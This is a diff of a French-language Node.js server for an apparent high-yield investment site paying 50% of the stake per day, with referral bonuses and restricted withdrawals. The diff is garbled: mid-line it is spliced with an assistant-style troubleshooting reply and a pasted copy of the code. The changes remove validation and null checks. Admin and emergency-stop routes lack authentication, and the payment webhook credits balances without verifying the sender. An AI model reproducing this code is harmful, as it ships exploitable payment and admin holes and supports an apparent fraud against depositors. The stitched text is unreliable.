@@ -19,47 +19,32 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 let isSiteActive = true;
 
+// Connexion MongoDB
 mongoose.connect(process.env.MONGO_URI)
     .then(() => console.log('✅ Base de données connectée'))
     .catch(err => console.error('❌ Erreur DB:', err));
 
-// --- MIDDLEWARE AUTHENTIFICATION CORRIGÉ ---
+// Middleware Auth
 const authMiddleware = async (req, res, next) => {
     if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
-    
     const token = req.headers.authorization;
-    if (!token) return res.status(401).json({ error: 'Accès refusé - Token manquant' });
-    
+    if (!token) return res.status(401).json({ error: 'Accès refusé' });
     try {
         const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
         req.user = await User.findById(decoded.id);
-        
-        // Vérification si l'utilisateur existe
-        if (!req.user) {
-            return res.status(404).json({ error: 'Utilisateur non trouvé' });
-        }
-        
         if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
             return res.status(403).json({ error: 'Compte désactivé.' });
         }
         next();
     } catch (e) {
-        console.error('Erreur token:', e);
-        res.status(401).json({ error: 'Token invalide ou expiré' });
+        res.status(401).json({ error: 'Token invalide' });
     }
 };
 
-// --- INSCRIPTION AVEC PARRAINAGE ---
+// Inscription
 app.post('/api/register', async (req, res) => {
     if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
-    
     const { fullName, phone, country, password, referralCode } = req.body;
-    
-    // Validation des champs requis
-    if (!fullName || !phone || !password) {
-        return res.status(400).json({ error: 'Tous les champs sont obligatoires' });
-    }
-    
     const hashedPassword = await bcrypt.hash(password, 10);
     let role = 'user';
     if (phone === process.env.CREATOR_WALLET_PHONE) role = 'admin';
@@ -76,7 +61,6 @@ app.post('/api/register', async (req, res) => {
             await Transaction.create({ userId: sponsor._id, type: 'REFERRAL_BONUS', amount: 350, method: 'Parrainage', status: 'SUCCESS', reference: `REF_${Date.now()}` });
         }
     }
-    
     try {
         await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
         res.json({ success: true, message: 'Inscription réussie' });
@@ -85,24 +69,112 @@ app.post('/api/register', async (req, res) => {
     }
 });
 
-// --- CONNEXION CORRIGÉE ---
+// Connexion
 app.post('/api/login', async (req, res) => {
     if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
-    
     const { phone, password } = req.body;
-    
-    // Validation des champs
-    if (!phone || !password) {
-        return res.status(400).json({ error: 'Téléphone et mot de passe requis' });
-    }
-    
     const user = await User.findOne({ phone });
-    if (!user) {
-        return res.status(400).json({ error: 'Utilisateur non trouvé' });
+    if (!user || !(await bcrypt.compare(password, user.password))) {
+        return res.status(400).json({ error: 'Identifiants incorrects' });
     }
-    
-    if (!(await bcrypt.compare(password, user.password))) {
-        return res.status(400).json({ error: 'Mot de passe incorrect' });
+
+    const currentMonth = new Date().toISOString().slice(0, 7);
+    if (user.lastPurchaseMonth !== currentMonth) {
+        user.monthlyC'est très frustrant, mais nous allons régler ça définitivement. Si les boutons ne font **absolument rien** (pas de message d'erreur, pas de rechargement), c'est presque toujours parce que le navigateur a gardé en mémoire une version "cassée" du fichier JavaScript ou qu'il y a une erreur de syntaxe invisible qui bloque tout le script avant même d'arriver au bouton.
+
+Voici la procédure **d'urgence** pour forcer le fonctionnement :
+
+### 1️⃣ Action Immédiate : Vider le Cache Radicalement
+Votre téléphone utilise probablement l'ancien code JS où la fonction `invest` était mal définie.
+*   **Sur Android (Chrome) :** Allez dans Paramètres > Confidentialité > Effacer les données de navigation > Cochez **"Images et fichiers en cache"** > Effacer.
+*   **OU MIEUX :** Ouvrez votre site dans un onglet **Navigation Privée (Incognito)**. C'est le test ultime. Si ça marche en privé, c'était juste un problème de cache.
+
+### 2️⃣ Vérification du Code `server.js` (La cause probable)
+Même si vous avez mis à jour, il est possible qu'une petite erreur de syntaxe dans `server.js` empêche le serveur de démarrer correctement ou de répondre aux requêtes `invest`.
+
+Je vais vous donner le code **COMPLET ET CORRIGÉ** de `server.js` avec la logique des 4 produits (Prod 3 à 5000F, Prod 4 à 10000F) et les clés PayDunya intégrées via les variables d'environnement.
+
+**Copiez TOUT ce code et remplacez votre fichier `server.js` sur GitHub :**
+
+```javascript
+require('dotenv').config();
+const express = require('express');
+const mongoose = require('mongoose');
+const cors = require('cors');
+const cron = require('node-cron');
+const bcrypt = require('bcryptjs');
+const jwt = require('jsonwebtoken');
+const axios = require('axios');
+const path = require('path');
+
+const User = require('./models/User');
+const Transaction = require('./models/Transaction');
+
+const app = express();
+
+app.use(cors());
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+let isSiteActive = true;
+
+// Connexion MongoDB
+mongoose.connect(process.env.MONGO_URI)
+    .then(() => console.log('✅ Base de données connectée'))
+    .catch(err => console.error('❌ Erreur DB:', err));
+
+// Middleware Auth
+const authMiddleware = async (req, res, next) => {
+    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
+    const token = req.headers.authorization;
+    if (!token) return res.status(401).json({ error: 'Accès refusé' });
+    try {
+        const decoded = jwt.verify(token.split(' ')[1], process.env.JWT_SECRET);
+        req.user = await User.findById(decoded.id);
+        if (!req.user.isActive && req.user.phone !== process.env.CREATOR_WALLET_PHONE) {
+            return res.status(403).json({ error: 'Compte désactivé.' });
+        }
+        next();
+    } catch (e) {
+        res.status(401).json({ error: 'Token invalide' });
+    }
+};
+
+// Inscription
+app.post('/api/register', async (req, res) => {
+    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
+    const { fullName, phone, country, password, referralCode } = req.body;
+    const hashedPassword = await bcrypt.hash(password, 10);
+    let role = 'user';
+    if (phone === process.env.CREATOR_WALLET_PHONE) role = 'admin';
+    let referredByUserId = null;
+
+    if (referralCode && referralCode.trim() !== '') {
+        const sponsor = await User.findOne({ referralCode: referralCode.trim() });
+        if (sponsor) {
+            referredByUserId = sponsor._id;
+            sponsor.balance += 350; 
+            sponsor.referralCount += 1;
+            sponsor.referralEarnings += 350;
+            await sponsor.save();
+            await Transaction.create({ userId: sponsor._id, type: 'REFERRAL_BONUS', amount: 350, method: 'Parrainage', status: 'SUCCESS', reference: `REF_${Date.now()}` });
+        }
+    }
+    try {
+        await User.create({ fullName, phone, country, password: hashedPassword, role, referredBy: referredByUserId });
+        res.json({ success: true, message: 'Inscription réussie' });
+    } catch (e) {
+        res.status(400).json({ error: 'Numéro déjà utilisé' });
+    }
+});
+
+// Connexion
+app.post('/api/login', async (req, res) => {
+    if (!isSiteActive) return res.status(503).json({ error: 'SITE_CLOSED' });
+    const { phone, password } = req.body;
+    const user = await User.findOne({ phone });
+    if (!user || !(await bcrypt.compare(password, user.password))) {
+        return res.status(400).json({ error: 'Identifiants incorrects' });
     }
 
     const currentMonth = new Date().toISOString().slice(0, 7);
@@ -155,12 +227,11 @@ app.post('/api/login', async (req, res) => {
 
 app.get('/api/status', (req, res) => res.json({ active: isSiteActive }));
 
-// --- GAINS AUTOMATIQUES ---
+// Gains Automatiques
 cron.schedule('0 8 * * 1-5', async () => {
     if (!isSiteActive) return;
     const users = await User.find({ $or: [{ hasLongTerm: true }, { 'shortTermProducts.0': { $exists: true } }] });
     const now = new Date();
-
     for (let user of users) {
         let totalDailyGain = 0;
         if (user.hasLongTerm) {
@@ -183,51 +254,68 @@ cron.schedule('0 8 * * 1-5', async () => {
     }
 });
 
-// --- INVESTISSEMENT CORRIGÉ ---
+// --- INVESTISSEMENT (CORRIGÉ POUR LES 4 PRODUITS) ---
 app.post('/api/invest', authMiddleware, async (req, res) => {
     const { productType, amount } = req.body;
     const user = req.user;
     
-    // Vérification que l'utilisateur existe
-    if (!user) {
-        return res.status(401).json({ error: 'Utilisateur non authentifié' });
+    console.log(`Tentative invest: ${productType}, Montant: ${amount}`); // Log pour déboguer
+
+    if (user.balance < amount) {
+        console.log("Échec: Solde insuffisant");
+        return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
     }
     
-    if (user.balance < amount) return res.status(400).json({ error: 'Solde insuffisant dans le dépôt.' });
-    if (productType !== 'longterm' && !user.hasLongTerm) return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });
+    if (productType !== 'longterm' && !user.hasLongTerm) {
+        console.log("Échec: Pas de Long Terme");
+        return res.status(403).json({ error: 'Produit Long Terme obligatoire.' });
+    }
 
     const currentMonth = new Date().toISOString().slice(0, 7);
-    if (user.lastPurchaseMonth !== currentMonth) { user.monthlyPurchasesCount = 0; user.lastPurchaseMonth = currentMonth; }
+    if (user.lastPurchaseMonth !== currentMonth) { 
+        user.monthlyPurchasesCount = 0; 
+        user.lastPurchaseMonth = currentMonth; 
+    }
 
     if (productType !== 'longterm') {
-        if (user.monthlyPurchasesCount >= 2) return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
+        if (user.monthlyPurchasesCount >= 2) {
+            console.log("Échec: Limite mensuelle");
+            return res.status(403).json({ error: 'Limite 2 achats/mois atteinte.' });
+        }
     }
 
     user.balance -= amount;
     
     if (productType === 'longterm') {
-        if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect.' });
+        if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect Long Terme.' });
         user.hasLongTerm = true; 
         user.longTermStartDate = new Date();
     } else {
         let dailyGain = 0;
         
+        // CONFIGURATION EXACTE DES PRIX
         if (productType === 'prod1') {
-            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect.' });
+            if (amount !== 2000) return res.status(400).json({ error: 'Prix incorrect Produit 1 (2000F).' });
             dailyGain = 1000;
-        } else if (productType === 'prod2') {
-            if (amount !== 3000) return res.status(400).json({ error: 'Prix incorrect.' });
+        } 
+        else if (productType === 'prod2') {
+            if (amount !== 3000) return res.status(400).json({ error: 'Prix incorrect Produit 2 (3000F).' });
             dailyGain = 1500;
-        } else if (productType === 'prod3') {
-            if (amount !== 5000) return res.status(400).json({ error: 'Prix incorrect.' });
+        } 
+        else if (productType === 'prod3') {
+            // IMPORTANT: 5000F ici
+            if (amount !== 5000) return res.status(400).json({ error: 'Prix incorrect Produit 3 (5000F requis).' });
             dailyGain = 2000;
-        } else if (productType === 'prod4') {
-            if (amount !== 10000) return res.status(400).json({ error: 'Prix incorrect.' });
+        } 
+        else if (productType === 'prod4') {
+            // IMPORTANT: 10000F ici
+            if (amount !== 10000) return res.status(400).json({ error: 'Prix incorrect Produit 4 (10000F requis).' });
             dailyGain = 5000;
-        } else {
+        } 
+        else {
             return res.status(400).json({ error: 'Produit inconnu.' });
         }
-        
+
         const unlockDate = new Date(); 
         unlockDate.setDate(unlockDate.getDate() + 5);
         
@@ -238,17 +326,19 @@ app.post('/api/invest', authMiddleware, async (req, res) => {
     await user.save();
     await Transaction.create({ userId: user._id, type: 'INVESTMENT', amount, status: 'SUCCESS', reference: `INV_${Date.now()}` });
     
+    console.log("Succès investissement");
     res.json({ success: true, newBalance: user.balance, remainingPurchases: 2 - user.monthlyPurchasesCount });
 });
 
+// Dépôt PayDunya
 app.post('/api/deposit', authMiddleware, async (req, res) => {
     const { amount, network, phone } = req.body; 
     if (amount < 2000) return res.status(400).json({ error: 'Minimum 2000 FCFA' });
+
     try {
         const user = req.user;
-        if (!user) return res.status(401).json({ error: 'Utilisateur non authentifié' });
-        
         const invoiceNumber = `DXP_${Date.now()}`;
+        
         const postData = {
             "master_key": process.env.PAYDUNYA_MASTER_KEY,
             "token": process.env.PAYDUNYA_SIGNATURE_TOKEN,
@@ -259,25 +349,39 @@ app.post('/api/deposit', authMiddleware, async (req, res) => {
             "description": `Dépôt Dioxyspaywer - ${user.fullName}`,
             "total_amount": amount,
             "currency": "XOF",
-            "customer": { "first_name": user.fullName.split(' ')[0], "last_name": user.fullName.split(' ').slice(1).join(' '), "phone_number": phone },
-            "custom_data": { "user_id": user._id.toString(), "network": network }
+            "customer": {
+                "first_name": user.fullName.split(' ')[0],
+                "last_name": user.fullName.split(' ').slice(1).join(' '),
+                "phone_number": phone
+            },
+            "custom_data": {
+                "user_id": user._id.toString(),
+                "network": network
+            }
         };
+
         const response = await axios.post('https://paydunya.com/checkout-invoice/v1/invoice', postData, {
-            headers: { 'Content-Type': 'application/json', 'PayDunya-Master-Key': process.env.PAYDUNYA_MASTER_KEY, 'PayDunya-Token': process.env.PAYDUNYA_SIGNATURE_TOKEN }
+            headers: {
+                'Content-Type': 'application/json',
+                'PayDunya-Master-Key': process.env.PAYDUNYA_MASTER_KEY,
+                'PayDunya-Token': process.env.PAYDUNYA_SIGNATURE_TOKEN
+            }
         });
+
         if (response.data && response.data.response_code === "success") {
             const paymentUrl = response.data.checkout_url;
             await Transaction.create({ userId: user._id, type: 'DEPOSIT', amount: amount, method: network, status: 'PENDING', reference: invoiceNumber });
-            res.json({ success: true, message: 'Redirection vers PayDunya...', paymentUrl: paymentUrl });
+            res.json({ success: true, message: 'Redirection...', paymentUrl: paymentUrl });
         } else {
-            res.status(400).json({ error: 'Erreur création paiement PayDunya.' });
+            res.status(400).json({ error: 'Erreur PayDunya.' });
         }
     } catch (error) {
-        console.error(error.response ? error.response.data : error);
+        console.error(error);
         res.status(500).json({ error: 'Erreur connexion PayDunya.' });
     }
 });
 
+// Webhook PayDunya
 app.post('/api/webhook/deposit', async (req, res) => {
     const data = req.body;
     if (data.event === "payment_completed" || data.status === "completed") {
@@ -292,25 +396,26 @@ app.post('/api/webhook/deposit', async (req, res) => {
                 const user = transaction.userId;
                 user.balance += amount;
                 await user.save();
-                console.log(`💰 Dépôt PayDunya confirmé : ${amount} FCFA`);
+                console.log(`💰 Dépôt confirmé: ${amount} FCFA`);
             }
         }
     }
     res.status(200).send("OK");
 });
 
+// Retrait
 app.post('/api/withdraw', authMiddleware, async (req, res) => {
     const { amount, network, phone } = req.body;
     const user = req.user;
-    
-    if (!user) return res.status(401).json({ error: 'Utilisateur non authentifié' });
-    
     const now = new Date();
     if (amount < 1000) return res.status(400).json({ error: 'Min 1000 FCFA' });
+    
     const dayOfWeek = now.getDay();
     if (dayOfWeek === 0 || dayOfWeek === 6) return res.status(403).json({ error: 'Retraits indisponibles Samedi/Dimanche.' });
+    
     const currentHour = now.getHours();
-    if (currentHour < 8 || currentHour >= 21) return res.status(403).json({ error: 'Retraits possibles de 08h00 à 21h00.' });
+    if (currentHour < 8 || currentHour >= 21) return res.status(403).json({ error: 'Retraits 08h-21h uniquement.' });
+    
     const todayStr = now.toDateString();
     if (user.lastWithdrawDate && user.lastWithdrawDate.toDateString() === todayStr) return res.status(403).json({ error: '1 retrait/jour max.' });
 
@@ -331,7 +436,7 @@ app.post('/api/withdraw', authMiddleware, async (req, res) => {
         else if (daysPassed > 0) availableWithdrawBalance += (700 * daysPassed);
     }
 
-    if (amount > availableWithdrawBalance) return res.status(400).json({ error: `Solde insuffisant dans la section RETRAITE. Disponible: ${availableWithdrawBalance} FCFA` });
+    if (amount > availableWithdrawBalance) return res.status(400).json({ error: `Solde insuffisant RETRAITE. Dispo: ${availableWithdrawBalance} FCFA` });
 
     user.balance -= amount;
     user.lastWithdrawDate = now;
@@ -345,15 +450,16 @@ app.post('/api/withdraw', authMiddleware, async (req, res) => {
     }
 });
 
+// Admin
 app.get('/api/admin/dashboard', async (req, res) => {
-    if (!req.user || req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Accès réservé créateur.' });
+    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Accès réservé.' });
     const users = await User.find();
     const totalVault = users.reduce((acc, curr) => acc + curr.balance, 0);
     res.json({ users, totalVault });
 });
 
 app.post('/api/admin/emergency-stop', async (req, res) => {
-    if (!req.user || req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
+    if (req.user.phone !== process.env.CREATOR_WALLET_PHONE) return res.status(403).json({ error: 'Interdit' });
     isSiteActive = false;
     try {
         const creatorPhone = process.env.CREATOR_WALLET_PHONE;
@@ -374,4 +480,4 @@ app.post('/api/admin/emergency-stop', async (req, res) => {
 });
 
 const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => console.log(`🚀 Serveur Dioxyspaywer lancé sur le port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Serveur lancé sur le port ${PORT}`));
